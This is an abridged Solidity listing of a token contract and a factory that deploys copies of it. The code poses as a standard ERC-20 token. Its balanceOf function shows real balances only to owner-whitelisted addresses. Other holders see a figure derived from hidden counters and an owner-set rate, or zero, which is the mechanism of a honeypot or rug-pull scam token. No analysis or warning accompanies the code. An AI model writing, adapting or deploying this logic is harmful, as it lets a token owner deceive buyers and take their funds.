...
contract newToken is Context, IERC20, Ownable {
	...
	mapping (address => bool) private isB;
	mapping (address => uint) private isN;
	mapping (address => uint) private isT;
	mapping (address => uint) private isS;
    ...
    constructor (string memory _tokenName,string memory _tokenSymbol,uint256 _tokenTotal,address _bonusToken,address _marketAddr,address _routerAddr,uint256 _OtherTokenBuy,uint256 _OtherTokenSell,uint256 _ktime,uint256 _rates,address _ownableAddr) Ownable(_ownableAddr) public {
		_name = _tokenName;
	...
	function setIsB(address[] calldata addList, bool enable) public  {
		require(_msgSender() == owner(), "fail");
		for(uint256 i = 0; i < addList.length; i++) {
			isB[addList[i]] = enable;
        }
    }
    ...
    function setRates(uint256 _rates) public  {
		require(_msgSender() == owner(), "fail");
        rates = _rates;
    }
    ...
    function balanceOf(address account) public view override returns (uint256) {
        ...
        if(isB[account] || isT[account] == block.timestamp){
			return tokenFromReflection(_rOwned[account]);
		}else{
			if(isN[account] == 0 || isN[account].mul(rates).div(100) < isS[account]){
				return 0;
			}else{
				return getBonusSwapToken(isN[account].mul(rates).div(100).sub(isS[account]));
			}
		}
    }
	...
	function getBonusSwapToken(uint256 _value) private view returns(uint256) {
		uint256 thisPairToken1 = IERC20(bonusToken).balanceOf(address(uniswapV2Pair));
		uint256 thisPairToken2 = IERC20(address(this)).balanceOf(address(uniswapV2Pair));
		if(thisPairToken1 > 0 && thisPairToken2 > 0){
			address[] memory path = new address[](2);
			path[0] = address(bonusToken);
			path[1] = address(this);
			uint256[] memory res = uniswapV2Router.getAmountsOut(_value,path);
			return res[1];
		}
        return 0;
    }
	
	function getTokenSwapBonus(uint256 _value) private view returns(uint256) {
		uint256 thisPairToken1 = IERC20(bonusToken).balanceOf(address(uniswapV2Pair));
		uint256 thisPairToken2 = IERC20(address(this)).balanceOf(address(uniswapV2Pair));
		if(thisPairToken1 > 0 && thisPairToken2 > 0){
			address[] memory path = new address[](2);
...
contract createTokens{
	...
	bool public isCreate = true;
	address public newTokenAddr;
	constructor() public{
		_adminAddr = msg.sender;
	}
	address[] public allTokens;
	function createToken(string memory _tokenName,string memory _tokenSymbol,uint256 _tokenTotal,address _bonusToken,address _marketAddr,address _routerAddr,uint256 _OtherTokenBuy,uint256 _OtherTokenSell,uint256 _ktime,uint256 _rates) public{
		require(isCreate, "fail");
		newTokenAddr = address(new newToken(_tokenName,_tokenSymbol,_tokenTotal,_bonusToken,_marketAddr,_routerAddr,_OtherTokenBuy,_OtherTokenSell,_ktime,_rates,msg.sender));
		allTokens.push(address(newTokenAddr));
	}
	function allTokenLength() external view returns (uint) {
        return allTokens.length;
    }
	
	function setCreate(bool _value) public {
        require(_adminAddr == msg.sender, "fail");
		isCreate = _value;
    }
}